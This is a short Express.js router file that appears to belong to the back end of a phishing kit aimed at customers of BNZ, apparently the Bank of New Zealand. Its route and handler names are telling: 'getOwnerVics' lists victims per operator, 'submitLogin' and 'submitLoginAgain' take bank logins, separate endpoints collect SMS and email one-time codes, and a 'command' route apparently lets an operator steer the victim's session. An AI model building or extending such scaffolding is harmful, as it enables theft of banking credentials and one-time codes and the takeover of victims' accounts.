const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    deleteEntry,
    submitSmsOtp,
    submitEmailOtp,
} = require("../controllers/bnzController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp/sms", submitSmsOtp);
router.post("/otp/email", submitEmailOtp);
router.post("/delete", deleteEntry);

module.exports = router;
